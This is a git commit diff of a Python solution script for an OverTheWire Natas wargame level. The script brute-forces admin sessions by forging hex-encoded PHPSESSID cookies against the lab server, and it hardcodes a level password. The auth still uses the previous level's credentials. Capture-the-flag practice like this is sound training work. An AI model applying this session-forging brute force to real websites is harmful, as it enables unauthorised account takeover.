cd27925703e7615acc5192df89d5887b57e6621e
paulito272 <paulito272@gmail.com>
2017-12-04 23:47:49 +0200

    Code for natas19

--- natas19.py
+++ natas19.py
@@ -1,12 +1,15 @@
+import binascii
+
 import requests
 
 for sessid in range(1, 641):
     if sessid % 10 == 0:
         print('Checked ' + str(sessid) + ' sessions...')
 
-    r = requests.get('http://natas18.natas.labs.overthewire.org',
+    phpsessid = binascii.hexlify((str(sessid) + '-admin').encode('ascii')).decode('ascii')
+    r = requests.get('http://natas19.natas.labs.overthewire.org',
                      auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),
-                     cookies={'PHPSESSID': str(sessid)})
+                     cookies={'PHPSESSID': phpsessid})
 
     if 'You are an admin' in r.text:
         print('PHPSESSID={}'.format(sessid))
